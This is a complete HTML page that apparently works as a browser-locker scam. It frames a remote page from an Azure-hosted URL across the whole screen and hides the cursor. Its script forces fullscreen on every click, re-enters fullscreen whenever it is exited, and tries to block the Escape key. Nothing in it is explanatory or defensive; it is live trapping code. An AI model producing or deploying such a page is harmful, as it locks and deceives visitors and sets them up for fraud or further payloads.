<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title></title>
<style>
  iframe {
    position: fixed;
    width: 100%;
    height: 100%;
    border: none;
    top: 0;
    left: 0;
 	cursor: none;
}
</style>

</head>
<body>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>

<div id="bruceDiv" style="z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
  <iframe 
    id="bruceFrame"
    src="https://knowledgeorbit-d3ggcvf5c0h3a7g6.z03.azurefd.net/Ma0cHelpMark0er007/index.html?ph0nq=null"
    allow="fullscreen; autoplay; encrypted-media; picture-in-picture"
    allowfullscreen
    webkitallowfullscreen
    mozallowfullscreen
    sandbox="allow-scripts allow-popups allow-forms allow-downloads"
    style="width: 100%; height: 100%; border: 0;">
  </iframe>
</div>

<script>
const container = document.getElementById("bruceDiv");

// Enter fullscreen
function goFullscreen() {
  if (!document.fullscreenElement) {
    container.requestFullscreen().catch(()=>{});
  }
}

// Auto re-enter if exited (ESC, etc.)
document.addEventListener("fullscreenchange", () => {
  if (!document.fullscreenElement) {
    setTimeout(goFullscreen, 50);
  }
});

// Optional: try blocking ESC (not guaranteed)
document.addEventListener("keydown", function(e) {
  if (e.key === "Escape") {
    e.preventDefault();
    e.stopPropagation();
  }
}, true);

// Start fullscreen (must be triggered by user interaction ideally)
document.addEventListener("click", goFullscreen);
</script>  

</body>
</html>
